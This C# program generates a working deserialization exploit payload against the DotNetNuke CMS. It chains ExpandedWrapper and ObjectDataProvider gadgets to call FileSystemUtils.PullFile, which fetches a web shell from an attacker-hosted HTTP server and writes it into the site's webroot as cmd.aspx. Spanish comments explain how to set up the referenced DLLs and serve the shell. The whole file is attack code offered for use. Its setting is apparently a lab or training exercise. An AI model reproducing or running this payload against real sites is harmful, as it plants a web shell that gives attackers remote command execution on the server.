using System; 
using System.IO; 
using DotNetNuke.Common.Utilities; 
using System.Collections; 
using System.Data.Services.Internal; 
using System.Windows.Data;
using DotNetNuke.Common;

// AGREGAR REFERENNCIA
// PresentationFramework.dll -> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\WPF\PresentationFramework.dll
// System.Data.Services.dll  -> C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Data.Services\v4.0_4.0.0.0_b77a5c561934e089\System.Data.Services.dll
//DotNetNuke.dll             -> C:\inetpub\wwwroot\dnn9\bin\DotNetNuke.dll

// Tener en Desktop webshell.aspx
// servidor web via python como admin desde Desktop
namespace ExpWrapSerializer
{ 
    class Program
    {
        static void Main(string[] args)
        {
            Serialize(); 
        }

        public static void Serialize()
        {
            ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
            myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
            myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
            myExpWrap.ProjectedProperty0.MethodName = "PullFile";

            myExpWrap.ProjectedProperty0.MethodParameters.Add("http://localhost:8000/webshell.aspx");

            myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dnn9/cmd.aspx");

            Hashtable table = new Hashtable();
            table["myTableEntry"] = myExpWrap;
            String payload = XmlUtils.SerializeDictionary(table, "profile");

            TextWriter writer = new StreamWriter("C:\\Users\\RICHAR\\Desktop\\file_serial.txt");
            writer.Write(payload);
            writer.Close();
            Console.WriteLine("Done!");
        }
    } 
}
